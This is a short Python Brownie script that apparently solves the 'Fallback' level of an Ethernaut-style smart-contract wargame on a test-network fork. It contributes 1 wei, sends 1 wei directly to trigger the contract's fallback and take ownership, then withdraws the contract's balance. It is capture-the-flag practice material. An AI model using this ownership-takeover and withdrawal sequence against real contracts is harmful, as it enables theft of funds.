from brownie import Fallback, Contract

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "01_fallback"
INTERFACE_CONTRACT = Fallback


def solve_level(level_contract):
    account = get_account()
    print(f"Strated to solve {LEVEL_NAME}")
    tx = level_contract.contribute({"amount": 1, "from": account})
    tx.wait(1)
    print("Contribute is done")
    tx = account.transfer(level_contract, "1 wei")
    tx.wait(1)
    print("Transfer is done")
    tx = level_contract.withdraw({"from": account})
    tx.wait(1)
    print("Withdraw is done")


# brownie run scripts/_01_fallback.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(LEVEL_NAME, INTERFACE_CONTRACT)
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
